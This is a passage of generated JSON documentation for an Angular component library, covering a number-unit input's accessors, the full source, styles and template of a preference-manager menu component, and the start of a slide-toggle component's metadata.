            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "fm",
            "type": "FocusMonitor",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "fb",
            "type": "FormBuilder",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "elRef",
            "type": "ElementRef<HTMLElement>",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "extends": "FormFieldBase",
      "implements": [
        "DoCheck",
        "OnInit",
        "OnDestroy",
        "ControlValueAccessor",
        "MatFormFieldControl"
      ],
      "accessors": {
        "disabled": {
          "name": "disabled",
          "setSignature": {
            "name": "disabled",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "disable",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 100,
            "jsdoctags": [
              {
                "name": "disable",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "disabled",
            "type": "boolean",
            "returnType": "boolean",
            "line": 96
          }
        },
        "readonly": {
          "name": "readonly",
          "setSignature": {
            "name": "readonly",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 116,
            "jsdoctags": [
              {
                "name": "value",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "readonly",
            "type": "boolean",
            "returnType": "boolean",
            "line": 112
          }
        },
        "list": {
          "name": "list",
          "setSignature": {
            "name": "list",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 130,
            "jsdoctags": [
              {
                "name": "value",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "list",
            "type": "",
            "returnType": "",
            "line": 126
          }
        },
        "fractionSize": {
          "name": "fractionSize",
          "setSignature": {
            "name": "fractionSize",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "fractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 142,
            "jsdoctags": [
              {
                "name": "fractionSize",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "fractionSize",
            "type": "",
            "returnType": "",
            "line": 138
          }
        },
        "empty": {
          "name": "empty",
          "getSignature": {
            "name": "empty",
            "type": "",
            "returnType": "",
            "line": 147
          }
        },
        "placeholder": {
          "name": "placeholder",
          "setSignature": {
            "name": "placeholder",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 159,
            "jsdoctags": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "placeholder",
            "type": "",
            "returnType": "",
            "line": 155
          }
        },
        "unitPlaceholder": {
          "name": "unitPlaceholder",
          "setSignature": {
            "name": "unitPlaceholder",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 171,
            "jsdoctags": [
              {
                "name": "plh",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "unitPlaceholder",
            "type": "",
            "returnType": "",
            "line": 167
          }
        },
        "required": {
          "name": "required",
          "setSignature": {
            "name": "required",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 183,
            "jsdoctags": [
              {
                "name": "req",
                "type": "",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "required",
            "type": "",
            "returnType": "",
            "line": 179
          }
        },
        "shouldLabelFloat": {
          "name": "shouldLabelFloat",
          "getSignature": {
            "name": "shouldLabelFloat",
            "type": "",
            "returnType": "",
            "line": 189
          }
        },
        "value": {
          "name": "value",
          "setSignature": {
            "name": "value",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "value",
                "type": "NumberUnit | null",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 199,
            "jsdoctags": [
              {
                "name": "value",
                "type": "NumberUnit | null",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "value",
            "type": "",
            "returnType": "NumberUnit | null",
            "line": 195
          }
        }
      },
      "templateData": "<div [formGroup]=\"form\"\n     class=\"number-unit-input-container\">\n  <input numberInput\n         #input\n         class=\"number-unit-input-element number-unit-input-value\"\n         (blur)=\"onTouched()\"\n         [fractionSize]=\"fractionSize\"\n         [unit]=\"select?.triggerValue\"\n         [placeholder]=\"placeholder\"\n         [appendUnit]=\"readonly\"\n         [readonly]=\"readonly\"\n         [tabindex]=\"(readonly || disabled) ? -1 : 0\"\n         type=\"text\"\n         formControlName=\"value\"/>\n  <mat-select formControlName=\"unit\"\n              [class.cdk-visually-hidden]=\"readonly\"\n              (blur)=\"onTouched()\"\n              [placeholder]=\"unitPlaceholder\"\n              class=\"number-unit-input-element number-unit-input-unit\">\n    <mat-option *ngIf=\"form.get('unit')?.value && unitOptional\"\n                class=\"sto-option--clear\"\n                [value]=\"null\">{{ unitClearText }}\n    </mat-option>\n    <mat-option *ngFor=\"let el of list\"\n                [value]=\"el.value\">\n      {{ el.title || el.value }}\n    </mat-option>\n  </mat-select>\n</div>\n<span class=\"number-unit-input-spacer\"></span>\n"
    },
    {
      "name": "PreferenceManagerComponent",
      "id": "component-PreferenceManagerComponent-8b4ace414f2aba5078bcf60e01f525135c057df729c04260bc3eae61ac4afe3f856b9220a1e1f310a0e5566b12a2c305eea400a8a3bc320627efb7785b6db46c",
      "file": "libs/common/src/lib/preference-manager/preference-manager.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-preference-manager",
      "styleUrls": [
        "./preference-manager.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./preference-manager.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "activePreferenceId",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nID of the selected preference\n",
          "description": "<p>ID of the selected preference</p>\n",
          "line": 45,
          "type": "string",
          "decorators": []
        },
        {
          "name": "dirty",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nIf the current preference has been modified\n",
          "description": "<p>If the current preference has been modified</p>\n",
          "line": 55,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "identifierKey",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nThe preference identifier (typically application area).\nIf missing, will be set to null\n",
          "description": "<p>The preference identifier (typically application area).\nIf missing, will be set to null</p>\n",
          "line": 40,
          "type": "string",
          "decorators": []
        },
        {
          "name": "loadingIndicator",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nWhether to show a progress spinner besides the title\n",
          "description": "<p>Whether to show a progress spinner besides the title</p>\n",
          "line": 50,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "placeholder",
          "defaultValue": "'No filter selected'",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nText to display when no preference is selected\n",
          "description": "<p>Text to display when no preference is selected</p>\n",
          "line": 60,
          "type": "string | null",
          "decorators": []
        },
        {
          "name": "preferences",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nList of the available preferences\n",
          "description": "<p>List of the available preferences</p>\n",
          "line": 34,
          "type": "Preference[]",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "addNewPreference",
          "defaultValue": "new EventEmitter<Preference>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\naddNewPreference emits when the user creates a new preference.\nThis does *not* include the current setup - that needs to be added by the consuming application\n",
          "description": "<p>addNewPreference emits when the user creates a new preference.\nThis does <em>not</em> include the current setup - that needs to be added by the consuming application</p>\n",
          "line": 87,
          "type": "EventEmitter"
        },
        {
          "name": "deletePreference",
          "defaultValue": "new EventEmitter<string>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\ndeletePreference emits when a preference is deleted\n",
          "description": "<p>deletePreference emits when a preference is deleted</p>\n",
          "line": 81,
          "type": "EventEmitter"
        },
        {
          "name": "editPreference",
          "defaultValue": "new EventEmitter<Preference>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\neditPreference emits any changed (existing) preference\n",
          "description": "<p>editPreference emits any changed (existing) preference</p>\n",
          "line": 71,
          "type": "EventEmitter"
        },
        {
          "name": "selectPreference",
          "defaultValue": "new EventEmitter<string>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nselectPreference emits whenever a preference is selected\n",
          "description": "<p>selectPreference emits whenever a preference is selected</p>\n",
          "line": 66,
          "type": "EventEmitter"
        },
        {
          "name": "setDefaultPreference",
          "defaultValue": "new EventEmitter<Preference>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nsetDefaultPreference emits when the user determines a new default preference\n",
          "description": "<p>setDefaultPreference emits when the user determines a new default preference</p>\n",
          "line": 76,
          "type": "EventEmitter"
        },
        {
          "name": "sharePreference",
          "defaultValue": "new EventEmitter<string>()",
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\nsharePreference emits when the user clicks the \"share\" button.\nEach application needs to implement this functionality for themselves.\n",
          "description": "<p>sharePreference emits when the user clicks the &quot;share&quot; button.\nEach application needs to implement this functionality for themselves.</p>\n",
          "line": 93,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "changedPreference",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Preference | null",
          "optional": false,
          "description": "",
          "line": 100,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "editIndex",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | null",
          "optional": false,
          "description": "",
          "line": 99,
          "rawdescription": "\n\n",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "pos": 2472,
              "end": 2485,
              "flags": 4227072,
              "modifierFlagsCache": 0,
              "transformFlags": 0,
              "kind": 325,
              "tagName": {
                "pos": 2473,
                "end": 2481,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 79,
                "escapedText": "internal"
              },
              "comment": ""
            }
          ]
        },
        {
          "name": "nameTmpl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef<HTMLInputElement>",
          "optional": false,
          "description": "",
          "line": 28,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "'nameTmpl'"
            }
          ]
        },
        {
          "name": "newPreference",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Preference | null",
          "optional": false,
          "description": "",
          "line": 101,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "trigger",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "MatMenuTrigger",
          "optional": false,
          "description": "",
          "line": 26,
          "decorators": [
            {
              "name": "ViewChild",
              "stringifiedArguments": "MatMenuTrigger"
            }
          ],
          "modifierKind": [
            121
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "addPreference",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 164,
          "deprecated": false,
          "deprecationMessage": ""
        },
        {
          "name": "cancelNewPreference",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 185,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": []
        },
        {
          "name": "cancelRename",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 121,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": []
        },
        {
          "name": "focusActiveItem",
          "args": [
            {
              "name": "menu",
              "type": "MatMenu",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 153,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": [
            {
              "name": "menu",
              "type": "MatMenu",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "openMenu",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 104,
          "deprecated": false,
          "deprecationMessage": "",
          "decorators": [
            {
              "name": "HostListener",
              "stringifiedArguments": "'click'"
            }
          ]
        },
        {
          "name": "overwrite",
          "args": [
            {
              "name": "pref",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 189,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "pref",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "renamePreference",
          "args": [
            {
              "name": "preference",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 111,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": [
            {
              "name": "preference",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "saveNewPreference",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 172,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": []
        },
        {
          "name": "saveRename",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 129,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": []
        },
        {
          "name": "toggleDefault",
          "args": [
            {
              "name": "preference",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 143,
          "deprecated": false,
          "deprecationMessage": "",
          "rawdescription": "\n\n",
          "description": "",
          "jsdoctags": [
            {
              "name": "preference",
              "type": "Preference",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [
        {
          "name": "click",
          "args": [],
          "argsDecorator": [],
          "deprecated": false,
          "deprecationMessage": "",
          "line": 104
        }
      ],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  ElementRef,\n  EventEmitter,\n  HostListener,\n  Input,\n  Output,\n  QueryList,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { Preference } from './preference';\nimport { MatMenu, MatMenuItem, MatMenuTrigger } from '@angular/material/menu';\nimport { take } from 'rxjs/operators';\n\n@Component({\n  selector: 'sto-preference-manager',\n  templateUrl: './preference-manager.component.html',\n  styleUrls: [ './preference-manager.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class PreferenceManagerComponent {\n  @ViewChild(MatMenuTrigger)\n  private trigger: MatMenuTrigger;\n  @ViewChild('nameTmpl')\n  nameTmpl: ElementRef<HTMLInputElement>;\n\n  /**\n   * List of the available preferences\n   */\n  @Input()\n  preferences: Preference[] = [];\n  /**\n   * The preference identifier (typically application area).\n   * If missing, will be set to null\n   */\n  @Input()\n  identifierKey: string;\n  /**\n   * ID of the selected preference\n   */\n  @Input()\n  activePreferenceId: string;\n  /**\n   * Whether to show a progress spinner besides the title\n   */\n  @Input()\n  loadingIndicator: boolean;\n  /**\n   * If the current preference has been modified\n   */\n  @Input()\n  dirty: boolean;\n  /**\n   * Text to display when no preference is selected\n   */\n  @Input()\n  placeholder: string | null = 'No filter selected';\n\n  /**\n   * selectPreference emits whenever a preference is selected\n   */\n  @Output()\n  selectPreference = new EventEmitter<string>();\n  /**\n   * editPreference emits any changed (existing) preference\n   */\n  @Output()\n  editPreference = new EventEmitter<Preference>();\n  /**\n   * setDefaultPreference emits when the user determines a new default preference\n   */\n  @Output()\n  setDefaultPreference = new EventEmitter<Preference>();\n  /**\n   * deletePreference emits when a preference is deleted\n   */\n  @Output()\n  deletePreference = new EventEmitter<string>();\n  /**\n   * addNewPreference emits when the user creates a new preference.\n   * This does *not* include the current setup - that needs to be added by the consuming application\n   */\n  @Output()\n  addNewPreference = new EventEmitter<Preference>();\n  /**\n   * sharePreference emits when the user clicks the \"share\" button.\n   * Each application needs to implement this functionality for themselves.\n   */\n  @Output()\n  sharePreference = new EventEmitter<string>();\n\n\n  /**\n   * @internal\n   */\n  public editIndex: number | null;\n  private changedPreference: Preference | null;\n  public newPreference: Preference | null;\n\n  @HostListener('click')\n  openMenu() {\n    this.trigger.openMenu();\n  }\n\n  /**\n   * @internal\n   */\n  renamePreference(preference: Preference) {\n    this.newPreference = null;\n    this.editIndex = this.preferences.indexOf(preference);\n    this.changedPreference = { ...preference };\n    requestAnimationFrame(() => this.nameTmpl.nativeElement.focus());\n  }\n\n  /**\n   * @internal\n   */\n  cancelRename() {\n    this.changedPreference = null;\n    this.editIndex = null;\n  }\n\n  /**\n   * @internal\n   */\n  saveRename() {\n    if (!this.changedPreference) {\n      return;\n    }\n    const el = this.nameTmpl.nativeElement;\n    this.changedPreference.name = el.value;\n    this.editPreference.emit(this.changedPreference);\n    this.editIndex = null;\n    this.changedPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  toggleDefault(preference: Preference) {\n    this.changedPreference = { ...preference };\n    this.changedPreference.default = true;\n    this.setDefaultPreference.emit(this.changedPreference);\n    this.changedPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  focusActiveItem(menu: MatMenu) {\n    menu._allItems.changes.pipe(take(1))\n      .subscribe((l: QueryList<MatMenuItem>) => {\n        l.forEach(it => {\n          if ( it._getHostElement().classList.contains('selected') ) {\n            requestAnimationFrame(() => it.focus());\n          }\n        });\n      });\n  }\n\n  addPreference() {\n    this.cancelRename();\n    this.newPreference = new Preference(this.identifierKey);\n  }\n\n  /**\n   * @internal\n   */\n  saveNewPreference() {\n    if (!this.newPreference) {\n      return;\n    }\n    const el = this.nameTmpl.nativeElement;\n    this.newPreference.name = el.value;\n    this.addNewPreference.emit(this.newPreference);\n    this.newPreference = null;\n  }\n\n  /**\n   * @internal\n   */\n  cancelNewPreference() {\n    this.newPreference = null;\n  }\n\n  overwrite(pref: Preference) {\n    this.editPreference.emit(pref);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": "// Add theme\nsto-preference-manager {\n  display: flex;\n  align-items: center;\n  cursor: pointer;\n\n  .filter-title {\n    small {\n      font-style: italic;\n    }\n  }\n\n  .mat-progress-spinner {\n    display: inline-block;\n  }\n\n  .filter-title-icon {\n    height: 14px;\n    width: 14px;\n    line-height: 14px;\n    margin-right: 8px;\n  }\n}\n\n.mat-menu-panel.preference-manager-list {\n  width: 350px;\n  min-height: 32px;\n\n  .mat-menu-content:not(:empty) {\n    padding-top: 0;\n    padding-bottom: 0;\n  }\n\n  .preference-manager-list-item {\n    display: flex;\n    padding: 0 8px;\n\n    &.edit {\n      padding-left: 0;\n    }\n\n    .preference-manager-list-item-title {\n      flex: 1 1 auto;\n\n      .mat-form-field {\n        min-height: 32px;\n        height: 32px;\n\n        .mat-form-field-wrapper {\n          padding-bottom: 0;\n\n          .mat-form-field-flex {\n            padding: 8px;\n\n            .mat-form-field-infix {\n              border-top: 0;\n              padding-top: 0;\n            }\n          }\n\n          .mat-form-field-subscript-wrapper {\n            display: none;\n          }\n\n          .mat-form-field-underline {\n            bottom: 1px;\n          }\n        }\n      }\n    }\n\n    .preference-manager-list-item-actions {\n      display: flex;\n      justify-content: flex-end;\n      flex: 0 0 50px;\n\n      .mat-icon {\n        margin-right: 0;\n      }\n\n      .mat-icon-button {\n        height: 32px;\n        width: 32px;\n        line-height: 32px;\n      }\n    }\n  }\n\n  .preference-manager-list-footer {\n    height: 53px;\n    padding: 8px;\n  }\n}\n",
          "styleUrl": "./preference-manager.component.scss"
        }
      ],
      "stylesData": "",
      "templateData": "<button mat-button\n        class=\"filter-title\"\n        (menuOpened)=\"focusActiveItem(menu)\"\n        [matMenuTriggerFor]=\"menu\"\n        #trigger=\"matMenuTrigger\"\n        [matMenuTriggerData]=\"{ preferences: preferences }\">\n  {{ (preferences | activePreference:activePreferenceId)?.name || placeholder }}\n  <small *ngIf=\"dirty\">(modified)</small>\n  <mat-icon class=\"filter-title-icon\">keyboard_arrow_down</mat-icon>\n  <mat-progress-spinner *ngIf=\"loadingIndicator\"\n                        [diameter]=\"16\"\n                        mode=\"indeterminate\"></mat-progress-spinner>\n</button>\n\n<mat-menu #menu=\"matMenu\"\n          class=\"sto-menu preference-manager-list\">\n  <ng-template matMenuContent>\n    <div mat-menu-item\n         (click)=\"selectPreference.emit(pref.id)\"\n         (keydown.enter)=\"selectPreference.emit(pref.id);trigger.closeMenu()\"\n         [disableRipple]=\"true\"\n         class=\"dense preference-manager-list-item\"\n         [class.edit]=\"editIndex === index\"\n         [class.selected]=\"activePreferenceId ? pref.id === activePreferenceId : pref.default\"\n         *ngFor=\"let pref of preferences; let index = index\">\n      <div class=\"preference-manager-list-item-title\">\n        <span *ngIf=\"editIndex !== index\">{{ pref.name }}\n          <small *ngIf=\"pref.default\">[default]</small>\n        </span>\n        <mat-form-field *ngIf=\"editIndex === index\"\n                        (click)=\"$event.stopPropagation()\"\n                        (keydown)=\"$event.stopPropagation()\"\n                        (keydown.enter)=\"saveRename()\"\n                        (keydown.escape)=\"trigger.closeMenu()\"\n                        class=\"sto-form__field\"\n                        floatLabel=\"never\">\n          <input matInput\n                 autocomplete=\"off\"\n                 (focus)=\"nameTmpl.select()\"\n                 [value]=\"pref.name\"\n                 name=\"name\"\n                 #nameTmpl>\n        </mat-form-field>\n      </div>\n      <div class=\"preference-manager-list-item-actions\">\n        <button *ngIf=\"editIndex === index\"\n                title=\"Save new name\"\n                (click)=\"$event.stopPropagation(); saveRename()\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button *ngIf=\"editIndex === index\"\n                title=\"Cancel rename\"\n                (click)=\"$event.stopPropagation(); cancelRename()\"\n                mat-icon-button>\n          <mat-icon>close</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation(); overwrite(pref)\"\n                title=\"Overwrite with current values\"\n                *ngIf=\"pref.external || (!editIndex && editIndex !== 0 && dirty && (activePreferenceId ? pref.id === activePreferenceId : pref.default))\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation();\"\n                *ngIf=\"!editIndex && editIndex !== 0\"\n                #moreTrigger=\"matMenuTrigger\"\n                [matMenuTriggerFor]=\"more\"\n                [matMenuTriggerData]=\"{preference: pref, trigger: moreTrigger}\"\n                mat-icon-button>\n          <mat-icon>more_vert</mat-icon>\n        </button>\n      </div>\n    </div>\n    <div mat-menu-item\n         [disableRipple]=\"true\"\n         *ngIf=\"newPreference\"\n         class=\"dense preference-manager-list-item edit\">\n      <div class=\"preference-manager-list-item-title\">\n        <mat-form-field (click)=\"$event.stopPropagation()\"\n                        (keydown)=\"$event.stopPropagation()\"\n                        (keydown.enter)=\"saveNewPreference()\"\n                        (keydown.escape)=\"trigger.closeMenu()\"\n                        class=\"sto-form__field\"\n                        floatLabel=\"never\">\n          <input matInput\n                 autocomplete=\"off\"\n                 (focus)=\"nameTmpl.select()\"\n                 [value]=\"newPreference.name\"\n                 name=\"name\"\n                 #nameTmpl>\n        </mat-form-field>\n      </div>\n      <div class=\"preference-manager-list-item-actions\">\n        <button (click)=\"$event.stopPropagation(); saveNewPreference()\"\n                mat-icon-button>\n          <mat-icon>save</mat-icon>\n        </button>\n        <button (click)=\"$event.stopPropagation(); cancelNewPreference()\"\n                mat-icon-button>\n          <mat-icon>close</mat-icon>\n        </button>\n      </div>\n    </div>\n    <div class=\"preference-manager-list-footer\"\n         (click)=\"$event.stopPropagation(); $event.preventDefault();\">\n      <button mat-stroked-button\n              (click)=\"addPreference()\"\n              color=\"primary\">New variant\n      </button>\n    </div>\n  </ng-template>\n</mat-menu>\n<mat-menu #more=\"matMenu\">\n  <ng-template matMenuContent\n               let-trigger=\"trigger\"\n               let-preference=\"preference\">\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); toggleDefault(preference)\"\n            mat-menu-item>Set as default\n    </button>\n    <button class=\"dense\"\n            mat-menu-item\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); renamePreference(preference)\">Rename\n    </button>\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); deletePreference.emit(preference.id)\"\n            mat-menu-item>Delete\n    </button>\n    <button class=\"dense\"\n            (click)=\"$event.stopPropagation(); trigger.closeMenu(); sharePreference.emit(preference.id)\"\n            mat-menu-item>Share\n    </button>\n  </ng-template>\n</mat-menu>\n\n"
    },
    {
      "name": "SlideToggleComponent",
      "id": "component-SlideToggleComponent-8bda7daf7113165fc555a9665e814efc3c319729f4c1528469f30476d63906a5efb096d96019e78a19e4a98353c98cfe61e20fc403bf0b4a094f381419441f56",
      "file": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [
        "ViewEncapsulation.None"
      ],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [
        {
          "name": "{ provide: MatFormFieldControl, useExisting: SlideToggleComponent }",
          "type": "component"
        }
      ],
      "selector": "sto-slide-toggle",
      "styleUrls": [
        "./slide-toggle.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./slide-toggle.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "color",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 105,
          "type": "ThemePalette",
          "decorators": []
        },
        {
          "name": "disabled",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 91,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "model",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 58,
          "type": "",
          "decorators": []
        },
        {
          "name": "readonly",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 117,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "required",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 136,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 148,
          "type": "boolean",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "toggled",
          "defaultValue": "new EventEmitter<StoSlideToggleChange>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 55,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "_color",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ThemePalette",
          "optional": false,
          "description": "",
          "line": 102,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_disabled",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 88,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_errorState",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 77,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_readonly",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 114,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_required",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 133,
          "modifierKind": [
            121
          ]
        },
        {
          "name": "_value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean | null",
          "optional": false,
          "description": "",
          "line": 145,
